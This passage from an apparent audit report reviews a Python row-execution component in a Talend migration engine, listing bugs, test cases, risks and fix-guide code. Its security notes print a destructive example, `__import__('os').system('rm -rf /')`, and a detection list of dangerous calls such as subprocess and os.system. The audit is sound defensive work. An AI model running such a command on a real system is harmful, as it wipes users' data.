| 8 | `context` access from user code | P1 | Context variable set before execution. User code reads `context['var_name']`. Verify correct value. |
| 9 | `routines` access from user code | P1 | Python routine loaded. User code calls `routines['MyRoutine'].my_function()`. Verify correct execution. |
| 10 | Output schema validation | P1 | `output_schema` provided. User code produces wrong type for a column. Verify type coercion or warning. |
| 11 | Multiple output columns | P1 | User code sets 10+ output columns. Verify all columns present in output DataFrame. |
| 12 | NaN in input_row | P1 | Input DataFrame with NaN values. Verify user code receives NaN (not None or error). Document behavior. |
| 13 | Empty string in input_row | P1 | Input DataFrame with empty string values. Verify user code receives `""`. |
| 14 | Reject flow completeness | P1 | Verify reject DataFrame contains original columns plus `errorCode` and `errorMessage`. |
| 15 | Multi-line Python code | P1 | Code with if/else, for loops, function definitions. Verify correct execution. |
| 16 | Row rebinding vs mutation | P1 | User code does `output_row = {"a": 1}` (rebind) vs `output_row["a"] = 1` (mutate). Verify both work. |

#### P2 -- Hardening

| # | Test Case | Priority | Description |
|----|-----------|----------|-------------|
| 17 | Large dataset performance | P2 | 100K rows. Measure execution time. Verify no memory explosion. |
| 18 | `output_row` with extra columns beyond schema | P2 | User code adds columns not in `output_schema`. Verify behavior (currently silently dropped). |
| 19 | Streaming mode with reject | P2 | HYBRID mode with large input. Verify reject rows are preserved across chunks. |
| 20 | User code imports | P2 | User code tries `import json`. Verify it works (currently does due to unrestricted builtins) but document. |
| 21 | Concurrent execution | P2 | Two PythonRowComponent instances executing simultaneously. Verify namespace isolation. |

---

## 9. Issues Summary

### P0 -- Critical

| ID | Category | Summary |
|----|----------|---------|
| CONV-PRC-001 | Converter | `CODE` stored under wrong config key `CODE` instead of `python_code`. Engine expects `python_code`. **Every converted tPythonRow job fails at runtime** with `ValueError: 'python_code' is required`. |
| BUG-PRC-001 | Bug (Cross-Cutting) | `_update_global_map()` in `base_component.py:304` references undefined variable `value` (should be `stat_value`). Will crash ALL components when `global_map` is set. |
| BUG-PRC-002 | Bug (Cross-Cutting) | `GlobalMap.get()` in `global_map.py:28` references undefined parameter `default`. Will crash on any `global_map.get()` call. Directly impacts user Python code calling `globalMap.get()`. |
| SEC-PRC-001 | Security | `exec()` with unrestricted `__builtins__`. User code has arbitrary code execution capability: file I/O, shell commands, network access, module imports. No sandboxing. |
| TEST-PRC-001 | Testing | Zero v1 unit tests for this component. All 201 lines of engine code are unverified. |

### P1 -- Major

| ID | Category | Summary |
|----|----------|---------|
| CONV-PRC-002 | Converter | `tPythonRow` not in component-level skip list for Java expression marking (line 462). `CODE`/`IMPORT` ARE protected by field-level skip (line 464), but other Python-specific params may be affected. Defensive fix needed. **(CORRECTED: downgraded from P1 to P2 -- see Appendix M/P)** |
| CONV-PRC-003 | Converter | No `output_schema` extraction. `tJavaRow` has `parse_java_row()` for this; `tPythonRow` does not. Engine's `_validate_output_row()` never triggers. |
| CONV-PRC-004 | Converter | No dedicated parser method. Uses deprecated generic fallback. Violates pattern established by `parse_java_row()`. |
| ENG-PRC-002 | Engine | No `die_on_error` support. All errors silently collected in reject. Talend default is `DIE_ON_ERROR=true` (stop on first error). |
| ENG-PRC-003 | Engine | No auto-passthrough of input columns to output. User must explicitly copy every field. Silently drops data for common Talend patterns. |
| ENG-PRC-004 | Engine | NaN values in `input_row` not handled. pandas NaN propagates silently instead of raising errors. |
| BUG-PRC-003 | Bug | `iterrows()` returns numpy types, not Python native types. User code `isinstance(val, int)` checks fail. |
| BUG-PRC-004 | Bug | Namespace adds explicit builtins redundantly while `__builtins__` is unrestricted. Misleading security posture. |
| BUG-PRC-009 | Bug | Cross-row state leak via shared mutable `context_dict`. Created once before loop (line 61), same reference passed to every row. User code mutations persist across rows. Diverges from Talend's immutable context. |
| BUG-PRC-010 | Bug (Cross-Cutting) | `_update_global_map()` crash in error handler (line 231) masks original exception. User sees NameError instead of actual processing error. |
| STD-PRC-001 | Standards | No `parse_python_row()` method. No `elif` branch in converter dispatch. |
| PERF-PRC-001 | Performance | `iterrows()` is a known pandas anti-pattern. ~10x slower than `itertuples()`. |

### P2 -- Moderate

| ID | Category | Summary |
|----|----------|---------|
| CONV-PRC-005 | Converter | `DIE_ON_ERROR` stored under wrong key and engine does not read it. |
| ENG-PRC-005 | Engine | `globalMap.get()` is broken in user code (cross-cutting GlobalMap bug). |
| ENG-PRC-006 | Engine | No `IMPORT` / setup code support. User cannot import libraries. |
| ENG-PRC-007 | Engine | Empty string vs NaN handling inconsistent depending on upstream component. |
| ENG-PRC-008 | Engine | `{id}_ERROR_MESSAGE` not set in globalMap. |
| BUG-PRC-005 | Bug | `_validate_output_row()` silently drops extra columns not in schema. |
| BUG-PRC-006 | Bug | Type mapping in `_validate_output_row()` is incomplete. Missing: Date, Long, BigDecimal, Short, Byte. |
| BUG-PRC-007 | Bug | `exec()` re-parses/compiles code string every row. No `compile()` pre-compilation. |
| BUG-PRC-011 | Bug | `globalMap` can be None -- user code calling `globalMap.put()` crashes with AttributeError. Separate from BUG-PRC-002. |
| NAME-PRC-001 | Naming | Config key `python_code` does not match Talend XML `CODE`. Converter must map. |
| STD-PRC-002 | Standards | No `_validate_config()` override. No early validation of required `python_code`. |
| STD-PRC-003 | Standards | Schema types use Python format instead of Talend format. |
| SEC-PRC-002 | Security | No code content validation or static analysis before `exec()`. |
| PERF-PRC-002 | Performance | `exec()` re-parses code every row. Should use `compile()`. |
| PERF-PRC-003 | Performance | `row.to_dict()` creates new dict per row. Memory churn for wide DataFrames. |

### P3 -- Low

| ID | Category | Summary |
|----|----------|---------|
| ENG-PRC-009 | Engine | `output_row` rebinding behavior should be documented (currently works correctly). |
| NAME-PRC-002 | Naming | `PythonRowComponent` has `Component` suffix -- consistent within code-execution family. |

### Issue Count Summary

| Priority | Count | Categories |
|----------|-------|------------|
| P0 | 5 | 1 converter, 2 bugs (cross-cutting), 1 security, 1 testing |
| P1 | 12 | 3 converter, 3 engine, 4 bugs, 1 standards, 1 performance |
| P2 | 15 | 1 converter, 4 engine, 4 bugs, 1 naming, 2 standards, 1 security, 2 performance |
| P3 | 2 | 1 engine, 1 naming |
| **Total** | **34** | |

---

## 10. Recommendations

### Immediate (Before Production)

1. **Create dedicated converter parser** (CONV-PRC-001, CONV-PRC-002, CONV-PRC-003, CONV-PRC-004): Add a `parse_python_row()` method in `component_parser.py` mirroring `parse_java_row()`. Map `CODE` -> `python_code`, `IMPORT` -> `imports`, extract `output_schema` from FLOW metadata. Add `elif component_type == 'tPythonRow'` branch in `converter.py`. Add `'tPythonRow'`, `'tPython'`, `'tPythonDataFrame'` to the Java expression marking skip list on line 462. **Impact**: Without this fix, every converted tPythonRow job fails at runtime. **Risk**: Low.

2. **Fix `_update_global_map()` bug** (BUG-PRC-001): Change `value` to `stat_value` on `base_component.py` line 304. **Impact**: Fixes ALL components (cross-cutting). **Risk**: Very low (log message only).

3. **Fix `GlobalMap.get()` bug** (BUG-PRC-002): Add `default: Any = None` parameter to the `get()` method signature in `global_map.py` line 26. **Impact**: Fixes ALL components and user Python code using `globalMap.get()`. **Risk**: Very low.

4. **Create unit test suite** (TEST-PRC-001): Implement at minimum the 7 P0 test cases listed in Section 8.2.

5. **Add `die_on_error` support** (ENG-PRC-002): Read `die_on_error` from config (defaulting to `True` to match Talend). When `True`, re-raise the first per-row exception instead of collecting it in reject. When `False`, use current reject-collection behavior.

### Short-Term (Hardening)

6. **Implement auto-passthrough** (ENG-PRC-003): Before executing user code, pre-populate `output_row` with `input_row.copy()`. This matches Talend's default `MAP_TYPE=MAP` behavior where unset output columns pass through from input. Make this conditional on a `auto_passthrough` config flag (defaulting to `True`).

7. **Add `IMPORT` / setup code support** (ENG-PRC-006): Accept an `imports` config key. Execute it once before the row loop via `exec(imports, namespace)`. This allows `import json`, `import re`, helper function definitions, etc.

8. **Pre-compile Python code** (BUG-PRC-007, PERF-PRC-002): Before the row loop, call `compiled_code = compile(python_code, '<python_row>', 'exec')`. Inside the loop, use `exec(compiled_code, namespace)`. This eliminates per-row parsing overhead.

9. **Replace `iterrows()` with `itertuples()`** (PERF-PRC-001): While this changes the `input_row` interface from dict to namedtuple, the performance gain is significant (~10x for iteration). Alternatively, keep `iterrows()` but convert to native Python types via a helper.

10. **Handle NaN/None in `input_row`** (ENG-PRC-004): After `row.to_dict()`, replace `NaN`/`NaT` values with `None` to match Talend's null semantics: `input_row = {k: (None if pd.isna(v) else v) for k, v in row.to_dict().items()}`.

11. **Set `{id}_ERROR_MESSAGE` in globalMap** (ENG-PRC-008): After the row loop, if `reject_rows` is non-empty, store the last error message in globalMap.

12. **Complete type mapping** (BUG-PRC-006): Add `Date/date/datetime`, `Long/long`, `BigDecimal/Decimal/decimal`, `Short/short`, `Byte/byte` to the type mapping in `_validate_output_row()`.

### Long-Term (Security & Optimization)

13. **Restrict `__builtins__` in `exec()` namespace** (SEC-PRC-001): Set `namespace['__builtins__'] = {}` and explicitly add only safe builtins. Create an allowlist of permitted functions. For production use with untrusted configs, consider using `RestrictedPython` or similar sandboxing library.

14. **Add code content validation** (SEC-PRC-002): Before `exec()`, scan the code string for dangerous patterns (`__import__`, `open(`, `subprocess`, `os.system`, `eval(`, `exec(`). Log warnings or block based on security policy.

15. **Fix streaming mode reject loss**: Modify `_execute_streaming()` in `base_component.py` to collect reject DataFrames from each chunk, not just main output.

16. **Optimize `row.to_dict()`** (PERF-PRC-003): For wide DataFrames, consider accessing values by column name directly from the row Series rather than creating a dict copy.

---

## Appendix A: Converter Parameter Mapping Code

### Current: Generic Fallback (Broken)

```python
# component_parser.py lines 384-386
# This is the catch-all for unmapped components including tPythonRow
else:
    return config_raw
```

The raw config dict contains Talend XML parameter names (`CODE`, `IMPORT`, `DIE_ON_ERROR`, `MAP_TYPE`, etc.) which do not match the engine's expected keys (`python_code`, `imports`, `die_on_error`, etc.).

### tJavaRow Reference Implementation (Working)

```python
# component_parser.py lines 316-330 (_map_component_parameters)
elif component_type == 'tJavaRow':
    code = config_raw.get('CODE', '')
    code = code.replace('&#xD;&#xA;', '\n').replace('&#xA;', '\n').replace('&#xD;', '\n')
    imports = config_raw.get('IMPORT', '')
    imports = imports.replace('&#xD;&#xA;', '\n').replace('&#xA;', '\n').replace('&#xD;', '\n')
    return {
        'java_code': code,
        'imports': imports
    }

# component_parser.py lines 913-928 (parse_java_row - dedicated parser)
def parse_java_row(self, node, component: Dict) -> Dict:
    output_schema = {}
    if component['schema'].get('output'):
        for col in component['schema']['output']:
            python_type = col['type']
            java_type = self._python_type_to_java(python_type)
            output_schema[col['name']] = java_type
    component['config']['output_schema'] = output_schema
    return component

# converter.py line 375 (dispatch)
elif component_type == 'tJavaRow':
    component = self.component_parser.parse_java_row(node, component)
```

### Recommended: Dedicated Parser for tPythonRow

```python
# Add to component_parser.py _map_component_parameters()
elif component_type == 'tPythonRow':
    code = config_raw.get('CODE', '')
    code = code.replace('&#xD;&#xA;', '\n').replace('&#xA;', '\n').replace('&#xD;', '\n')
    imports = config_raw.get('IMPORT', '')
    imports = imports.replace('&#xD;&#xA;', '\n').replace('&#xA;', '\n').replace('&#xD;', '\n')
    return {
        'python_code': code,
        'imports': imports,
        'die_on_error': config_raw.get('DIE_ON_ERROR', True),
        'auto_passthrough': config_raw.get('MAP_TYPE', 'MAP') == 'AUTO_MAP'
    }

# Add to component_parser.py as new method
def parse_python_row(self, node, component: Dict) -> Dict:
    """Parse tPythonRow specific configuration"""
    output_schema = {}
    if component['schema'].get('output'):
        for col in component['schema']['output']:
            python_type = col['type']
            java_type = self._python_type_to_java(python_type)
            output_schema[col['name']] = java_type
    component['config']['output_schema'] = output_schema
    return component

# Add to converter.py dispatch
elif component_type == 'tPythonRow':
    component = self.component_parser.parse_python_row(node, component)

# Add to component_parser.py line 462 skip list
if component_name not in ['tMap', 'tJavaRow', 'tJava', 'tPythonRow', 'tPython', 'tPythonDataFrame']:
```

---

## Appendix B: Engine Class Structure

```
PythonRowComponent (BaseComponent)
    No Constants (uses config directly)

    Methods:
        _process(input_data) -> Dict[str, Any]           # Main entry: row-by-row exec()
        _get_context_dict() -> Dict[str, Any]             # Flatten context for namespace
        _validate_output_row(row, schema, idx) -> Dict    # Type validation per row

    Inherited from BaseComponent:
        execute(input_data) -> Dict[str, Any]             # Lifecycle: resolve, process, stats
        _update_global_map() -> None                      # Push stats to GlobalMap
        _update_stats(read, ok, reject) -> None           # Accumulate counters
        validate_schema(df, schema) -> pd.DataFrame       # Post-read type conversion
        get_python_routines() -> Dict[str, Any]           # Load Python routines
        _resolve_java_expressions() -> None               # Resolve {{java}} markers
        _auto_select_mode(data) -> ExecutionMode          # HYBRID mode switching
        _execute_batch(data) -> Dict                      # Direct _process() call
        _execute_streaming(data) -> Dict                  # Chunked _process() calls
```

---

## Appendix C: Edge Case Analysis

### Edge Case 1: Empty input DataFrame

| Aspect | Detail |
|--------|--------|
| **Talend** | Returns 0 rows, NB_LINE=0, NB_LINE_OK=0. No error. |
| **V1** | Line 46: checks `input_data is None or input_data.empty`, returns `{'main': pd.DataFrame()}`. Stats not updated (0,0,0 defaults). |
| **Verdict** | CORRECT |

### Edge Case 2: NaN values in numeric input columns

| Aspect | Detail |
|--------|--------|
| **Talend** | `input_row.age` is Java `null`. Code like `input_row.age + 1` throws `NullPointerException`. |
| **V1** | `input_row['age']` is `numpy.nan`. Code like `input_row['age'] + 1` produces `nan` silently. No exception raised. |
| **Verdict** | GAP -- silent NaN propagation instead of explicit null handling. User code may produce silently wrong results. |

### Edge Case 3: Empty string vs None in string columns

| Aspect | Detail |
|--------|--------|
| **Talend** | Distinguishes between `""` (empty string) and `null`. |
| **V1** | Depends on upstream component. If `keep_default_na=False` was set, strings are `""`. Otherwise, empty cells are `NaN`. Inconsistent. |
| **Verdict** | PARTIAL -- behavior depends on upstream component configuration. |

### Edge Case 4: User code raises exception on specific rows

| Aspect | Detail |
|--------|--------|
| **Talend** | With `DIE_ON_ERROR=false` + REJECT connected: row goes to REJECT. Job continues. |
| **V1** | Row goes to `reject_rows` with `errorCode='PYTHON_ERROR'`. Job continues. Correct. |
| **Verdict** | CORRECT (for die_on_error=false equivalent) |

### Edge Case 5: User code modifies `input_row`

| Aspect | Detail |
|--------|--------|
| **Talend** | `input_row` is read-only. Modifications have no effect on downstream. |
| **V1** | `input_row` is a regular dict from `row.to_dict()`. Modifications are local to the loop iteration and do not affect the original DataFrame. Correct. |
| **Verdict** | CORRECT |

### Edge Case 6: User code does not set any output columns

| Aspect | Detail |
|--------|--------|
| **Talend** | With `MAP_TYPE=MAP`, unset output columns get auto-passthrough from input. With `MAP_TYPE=AUTO_MAP`, all input columns pass through. If user sets nothing, output = input. |
| **V1** | `output_row = {}` (empty). Output DataFrame has zero columns for that row. Results in a DataFrame with no columns if no row sets anything. |
| **Verdict** | GAP -- no auto-passthrough. Silent data loss. |

### Edge Case 7: User code calls `globalMap.get("nonexistent_key")`

| Aspect | Detail |
|--------|--------|
| **Talend** | Returns `null`. No error. |
| **V1** | Calls `GlobalMap.get()` which crashes with `NameError: name 'default' is not defined` (BUG-PRC-002). |
| **Verdict** | CRASH -- cross-cutting GlobalMap bug. |

### Edge Case 8: HYBRID streaming mode with per-row state in globalMap

| Aspect | Detail |
|--------|--------|
| **Talend** | N/A -- Talend processes all rows in one pass. |
| **V1** | `globalMap` is a shared object reference. State written by user code in chunk 1 is visible in chunk 2. Correct behavior for stateful row processing. |
| **Verdict** | CORRECT |

### Edge Case 9: `output_row` rebinding vs mutation

| Aspect | Detail |
|--------|--------|
| **Talend** | `output_row.col = val` mutates the output row object. Cannot rebind `output_row` itself. |
| **V1** | `output_row['col'] = val` (mutation) and `output_row = {"col": val}` (rebinding) both work. Line 97 reads `namespace['output_row']` which captures rebinding. |
| **Verdict** | CORRECT -- V1 is more flexible than Talend. |

### Edge Case 10: Very large Python code string

| Aspect | Detail |
|--------|--------|
| **Talend** | Talend compiles Java code once. Large code has compile overhead but runs efficiently per row. |
| **V1** | `exec(python_code, namespace)` re-parses code every row. Large code strings (1000+ lines) multiply the parsing overhead by row count. |
| **Verdict** | PERFORMANCE GAP -- should use `compile()` pre-compilation. |

### Edge Case 11: `_update_global_map()` crash after processing

| Aspect | Detail |
|--------|--------|
| **Talend** | N/A. |
| **V1** | After `_process()` completes, `execute()` calls `_update_global_map()` (base_component.py line 218). This crashes with `NameError: name 'value' is not defined` (BUG-PRC-001). The `_process()` results are lost because the exception propagates from the base class. |
| **Verdict** | CRASH -- cross-cutting base class bug causes loss of all processing results. |

### Edge Case 12: `exec()` security with untrusted code

| Aspect | Detail |
|--------|--------|
| **Talend** | Code is written by developers in Talend Studio. JVM provides some sandboxing. |
| **V1** | `exec()` has unrestricted `__builtins__`. Code can `__import__('os').system('rm -rf /')`. No sandboxing. |
| **Verdict** | SECURITY GAP -- acceptable for trusted converted jobs, critical risk for untrusted configs. |

### Edge Case 13: Output schema type validation with NaN

| Aspect | Detail |
|--------|--------|
| **Talend** | Schema enforces types at compile time. Null values handled per-type. |
| **V1** | `_validate_output_row()` line 184 checks `if value is not None`. But `NaN` is not `None` (`NaN is not None` is True). So NaN values are passed to type converter, e.g., `int(NaN)` raises `ValueError`. This is caught on line 188 and the original `NaN` value is kept with a warning. |
| **Verdict** | PARTIAL -- NaN triggers warning but does not crash. However, the output column contains NaN instead of a typed value, which may cause downstream issues. |

### Edge Case 14: Reject flow in streaming mode

| Aspect | Detail |
|--------|--------|
| **Talend** | All reject rows collected regardless of processing mode. |
| **V1** | `_execute_streaming()` in base_component.py line 271 only collects `chunk_result['main']`. Reject rows from `chunk_result.get('reject')` are silently discarded. |
| **Verdict** | GAP -- reject information lost in streaming mode. |

### Edge Case 15: `input_row` / `output_row` pattern with `iterrows()` index

| Aspect | Detail |
|--------|--------|
| **Talend** | Row index is implicit. No explicit row index exposed to user code. |
| **V1** | `for idx, row in input_data.iterrows()` exposes `idx` but does NOT pass it to user code namespace. User code has no access to the row index. Correct -- matches Talend behavior. |
| **Verdict** | CORRECT |

---

## Appendix D: Cross-Cutting Issues

The following issues were discovered during this audit but affect the entire v1 engine, not just `PythonRowComponent`:

| ID | Priority | Component | Issue |
|----|----------|-----------|-------|
| BUG-PRC-001 | **P0** | `base_component.py:304` | `_update_global_map()` references undefined `value` variable. Will crash ALL components. |
| BUG-PRC-002 | **P0** | `global_map.py:28` | `GlobalMap.get()` references undefined `default` parameter. Will crash on any `get()` call. |

These should be tracked in a cross-cutting issues report as well.

---

## Appendix E: Comparison with tJavaRow Converter/Engine

| Aspect | tJavaRow (V1) | tPythonRow (V1) | Gap |
|--------|---------------|-----------------|-----|
| Converter: `_map_component_parameters()` branch | Yes (line 317) | **No** (falls through to generic) | P0 |
| Converter: Dedicated `parse_*()` method | Yes (`parse_java_row()` line 913) | **No** | P1 |
| Converter: `output_schema` extraction | Yes (lines 917-926) | **No** | P1 |
| Converter: Java expression marking skip | Yes (line 462) | **No** (not in skip list) | P1 |
| Converter: `elif` in converter.py dispatch | Yes (line 375) | **No** | P1 |
| Engine: Row-by-row code execution | Yes (via Java bridge) | Yes (via `exec()`) | -- |
| Engine: `die_on_error` support | Via Java bridge error handling | **No** | P1 |
| Engine: `input_row` / `output_row` | Via Java bridge variables | Via Python namespace | -- |
| Engine: REJECT flow | Via Java bridge exceptions | Yes (per-row try/except) | -- |
| Engine: Code pre-compilation | N/A (Java bridge handles) | **No** (`exec()` re-parses) | P2 |
| Engine: `__builtins__` restriction | N/A (JVM sandbox) | **No** (unrestricted) | P0 (security) |

**Summary**: `tPythonRow` has 6 major gaps compared to `tJavaRow` in both converter and engine layers. The converter gaps are the most critical because they prevent the component from functioning at all with converted jobs.

---

## Appendix F: Risk Assessment for Production Migration

### High-Risk Scenarios

| Scenario | Risk Level | Affected Jobs | Mitigation |
|----------|-----------|---------------|------------|
| Any converted tPythonRow job | **Critical** | ALL | CONV-PRC-001 must be fixed -- config key mismatch causes 100% failure rate |
| Jobs with complex Python code (operators, function calls) | **Critical** | Most | CONV-PRC-002 must be fixed -- Java expression marking corrupts Python code |
| Jobs relying on auto-passthrough | **High** | Jobs where user code only sets new columns | Implement ENG-PRC-003 or require users to explicitly copy all input columns |
| Jobs using `globalMap.get()` in Python code | **High** | Jobs with cross-row state | Fix BUG-PRC-002 (GlobalMap.get() broken) |
| Jobs with `DIE_ON_ERROR=true` (default) | **High** | Most | Implement ENG-PRC-002 or document behavior difference |
| Jobs with null/NaN input data | **Medium** | Jobs processing real-world data | Implement NaN -> None conversion in input_row |
| Jobs importing libraries in IMPORT field | **Medium** | Jobs using external Python libs | Implement IMPORT support |

### Low-Risk Scenarios

| Scenario | Risk Level | Notes |
|----------|-----------|-------|
| Jobs with simple assignment-only code | Low | Basic `output_row['x'] = input_row['y']` works |
| Jobs using context variables | Low | Context access works correctly |
| Jobs using Python routines | Low | Routine access works correctly |
| Jobs with small datasets | Low | Performance issues only matter at scale |

### Recommended Migration Strategy

1. **Phase 0** (Blocker): Fix CONV-PRC-001 (config key mapping) and CONV-PRC-002 (Java expression skip). Without these, zero tPythonRow jobs can run.
2. **Phase 1**: Fix cross-cutting bugs (BUG-PRC-001, BUG-PRC-002). These affect all components.
3. **Phase 2**: Add `die_on_error` support. Add auto-passthrough. Add IMPORT support.
4. **Phase 3**: Create unit tests. Pre-compile code. Evaluate security posture.
5. **Phase 4**: Parallel-run migrated jobs against Talend originals. Compare output row-for-row.

---

## Appendix G: Implementation Fix Guides

### Fix Guide: CONV-PRC-001 -- Config Key Mapping

**File**: `src/converters/complex_converter/component_parser.py`
**Location**: `_map_component_parameters()` method (after line 383)

**Add before the `else` fallback on line 384**:
```python
elif component_type == 'tPythonRow':
    code = config_raw.get('CODE', '')
    code = code.replace('&#xD;&#xA;', '\n').replace('&#xA;', '\n').replace('&#xD;', '\n')
    imports = config_raw.get('IMPORT', '')
    imports = imports.replace('&#xD;&#xA;', '\n').replace('&#xA;', '\n').replace('&#xD;', '\n')
    return {
        'python_code': code,
        'imports': imports,
        'die_on_error': config_raw.get('DIE_ON_ERROR', True),
    }
```

**Impact**: Enables all converted tPythonRow jobs to run. **Risk**: Very low.

---

### Fix Guide: CONV-PRC-002 -- Java Expression Skip List

**File**: `src/converters/complex_converter/component_parser.py`
**Line**: 462

**Current**:
```python
if component_name not in ['tMap', 'tJavaRow', 'tJava']:
```

**Fix**:
```python
if component_name not in ['tMap', 'tJavaRow', 'tJava', 'tPythonRow', 'tPython', 'tPythonDataFrame']:
```

**Impact**: Prevents Python code from being corrupted by `{{java}}` marking. **Risk**: Very low.

---

### Fix Guide: CONV-PRC-003 -- Dedicated Parser with output_schema

**File**: `src/converters/complex_converter/component_parser.py`

**Add new method** (after `parse_java_row`):
```python
def parse_python_row(self, node, component: Dict) -> Dict:
    """Parse tPythonRow specific configuration"""
    output_schema = {}
    if component['schema'].get('output'):
        for col in component['schema']['output']:
            python_type = col['type']
            java_type = self._python_type_to_java(python_type)
            output_schema[col['name']] = java_type
    component['config']['output_schema'] = output_schema
    return component
```

**File**: `src/converters/complex_converter/converter.py`
**Add after line 376** (after tJavaRow branch):
```python
elif component_type == 'tPythonRow':
    component = self.component_parser.parse_python_row(node, component)
```

**Impact**: Enables output schema validation. **Risk**: Low.

---

### Fix Guide: ENG-PRC-002 -- Add die_on_error Support

**File**: `src/v1/engine/components/transform/python_row_component.py`

**In `_process()`, after line 54** (`if not python_code:`):
```python
die_on_error = self.config.get('die_on_error', True)
```

**Replace lines 105-111** (the except block):
```python
except Exception as e:
    if die_on_error:
        raise ValueError(
            f"Component {self.id}: Python code error at row {idx}: {e}"
        ) from e
    logger.error(f"Component {self.id}: Error processing row {idx}: {e}")
    reject_row = row.to_dict()
    reject_row['errorCode'] = 'PYTHON_ERROR'
    reject_row['errorMessage'] = str(e)
    reject_rows.append(reject_row)
```

**Impact**: Matches Talend default behavior (stop on first error). **Risk**: Medium (changes default behavior from silent to failing).

---

### Fix Guide: PERF-PRC-002 -- Pre-compile Python Code

**File**: `src/v1/engine/components/transform/python_row_component.py`

**Add before the row loop** (after line 67):
```python
try:
    compiled_code = compile(python_code, f'<{self.id}_python_row>', 'exec')
except SyntaxError as e:
    raise ValueError(f"Component {self.id}: Python code syntax error: {e}") from e
```

**Replace line 94**:
```python
exec(compiled_code, namespace)
```

**Impact**: Eliminates per-row code parsing. ~2-5x speedup for compute-light code. **Risk**: Very low.

---

### Fix Guide: ENG-PRC-003 -- Auto-Passthrough of Input Columns

**File**: `src/v1/engine/components/transform/python_row_component.py`

**Replace line 74** (`output_row = {}`):
```python
# Auto-passthrough: pre-populate output_row with input columns
# This matches Talend's default MAP_TYPE=MAP behavior
auto_passthrough = self.config.get('auto_passthrough', True)
if auto_passthrough:
    output_row = dict(input_row)  # Copy all input columns
else:
    output_row = {}
```

**Impact**: Matches Talend's default behavior where unset output columns pass through from input. Prevents silent data loss in common patterns like `output_row['status'] = "PROCESSED"` where only one new column is added. **Risk**: Medium -- changes output shape for existing configs that do not set `auto_passthrough`. Should default to `True` to match Talend.

---

### Fix Guide: ENG-PRC-004 -- NaN to None Conversion in input_row

**File**: `src/v1/engine/components/transform/python_row_component.py`

**Replace line 73** (`input_row = row.to_dict()`):
```python
# Convert row to dictionary, replacing NaN/NaT with None for Talend compatibility
raw_dict = row.to_dict()
input_row = {
    k: (None if pd.isna(v) else v)
    for k, v in raw_dict.items()
}
```

**Impact**: Matches Talend's null semantics where null values are explicit `null`/`None`, not NaN. User code `if input_row['age'] is None:` works as expected. **Risk**: Low -- may break user code that explicitly checks for NaN, but this is the correct Talend-compatible behavior.

---

### Fix Guide: ENG-PRC-006 -- IMPORT / Setup Code Support

**File**: `src/v1/engine/components/transform/python_row_component.py`

**Add after line 58** (after getting `python_routines`):
```python
# Execute import/setup code once (before row loop)
imports_code = self.config.get('imports', '')
if imports_code:
    try:
        compiled_imports = compile(imports_code, f'<{self.id}_imports>', 'exec')
        import_namespace = {
            'context': context_dict,
            'globalMap': self.global_map,
            'routines': python_routines,
            **python_routines,
        }
        exec(compiled_imports, import_namespace)
        # Make imported names available in per-row namespace
        setup_names = {k: v for k, v in import_namespace.items()
                       if k not in ('context', 'globalMap', 'routines', '__builtins__')}
    except Exception as e:
        raise ValueError(
            f"Component {self.id}: Error in import/setup code: {e}"
        ) from e
else:
    setup_names = {}
```

**Then in the per-row namespace (line 77-91), add**:
```python
namespace = {
    'input_row': input_row,
    'output_row': output_row,
    'context': context_dict,
    'globalMap': self.global_map,
    'routines': python_routines,
    **python_routines,
    **setup_names,  # <-- Add imported names
    'len': len,
    'str': str,
    'int': int,
    'float': float,
    'bool': bool,
}
```

**Impact**: Enables user code to import libraries (`import json`, `import re`, etc.) and define helper functions. **Risk**: Low.

---

### Fix Guide: BUG-PRC-003 -- numpy Type Conversion in input_row

**File**: `src/v1/engine/components/transform/python_row_component.py`

**Replace line 73** (`input_row = row.to_dict()`):
```python
# Convert row to dictionary with Python-native types
# pandas/numpy types (numpy.int64, numpy.float64, etc.) are converted to
# Python-native types (int, float, etc.) for compatibility with user code
import numpy as np

raw_dict = row.to_dict()
input_row = {}
for k, v in raw_dict.items():
    if pd.isna(v):
        input_row[k] = None
    elif isinstance(v, (np.integer,)):
        input_row[k] = int(v)
    elif isinstance(v, (np.floating,)):
        input_row[k] = float(v)
    elif isinstance(v, (np.bool_,)):
        input_row[k] = bool(v)
    elif isinstance(v, (pd.Timestamp,)):
        input_row[k] = v.to_pydatetime()
    else:
        input_row[k] = v
```

**Impact**: User code `isinstance(val, int)` checks work correctly. `val is None` checks catch null values. **Risk**: Low -- may change behavior for code that explicitly uses numpy types, but Python-native types are the expected interface.

---

### Fix Guide: BUG-PRC-006 -- Complete Type Mapping

**File**: `src/v1/engine/components/transform/python_row_component.py`

**Replace lines 166-177** (the `type_mapping` dict in `_validate_output_row()`):
```python
type_mapping = {
    # Python type names
    'str': str,
    'String': str,
    'int': int,
    'Integer': int,
    'long': int,
    'Long': int,
    'float': float,
    'Float': float,
    'Double': float,
    'double': float,
    'bool': bool,
    'Boolean': bool,
    # Date types (convert string to datetime)
    'Date': lambda v: pd.to_datetime(v) if isinstance(v, str) else v,
    'date': lambda v: pd.to_datetime(v) if isinstance(v, str) else v,
    'datetime': lambda v: pd.to_datetime(v) if isinstance(v, str) else v,
    # Decimal types (preserve precision)
    'BigDecimal': lambda v: Decimal(str(v)),
    'Decimal': lambda v: Decimal(str(v)),
    'decimal': lambda v: Decimal(str(v)),
    # Short/Byte (map to int)
    'Short': int,
    'short': int,
    'Byte': int,
    'byte': int,
}
```

**Impact**: Complete type coverage matching Talend's type system. **Risk**: Low.

---

## Appendix H: Detailed Code Walkthrough

### `_process()` (Lines 43-130)

The main processing method follows this flow:

1. **Input validation** (lines 46-48): Checks for `None` or empty input. Returns empty DataFrame. Note: does NOT call `_update_stats()` for empty input, so stats remain at defaults (0, 0, 0). This is correct.

2. **Config extraction** (lines 51-52): Gets `python_code` and `output_schema` from config.
   - `python_code` default is `''` (empty string)
   - `output_schema` default is `{}` (empty dict)
   - Line 54: Validates `python_code` is non-empty. Raises `ValueError` (NOT `ConfigurationError`).

3. **Routine and context setup** (lines 57-61):
   - `get_python_routines()` calls `python_routine_manager.get_all_routines()` if manager exists, else returns `{}`
   - `_get_context_dict()` flattens the nested context structure into a simple `{var_name: value}` dict

4. **Output/reject accumulators** (lines 64-65):
   - `output_rows = []` and `reject_rows = []`
   - These grow unbounded for the entire input dataset
   - No pre-allocation or size estimation

5. **Row loop** (lines 70-111):
   - `for idx, row in input_data.iterrows():` -- the slowest pandas iteration method
   - Per-row: `input_row = row.to_dict()` -- creates new dict with potentially numpy types
   - Per-row: `output_row = {}` -- always empty, no auto-passthrough
   - Per-row: Namespace construction (lines 77-91) -- creates new dict with 10+ entries
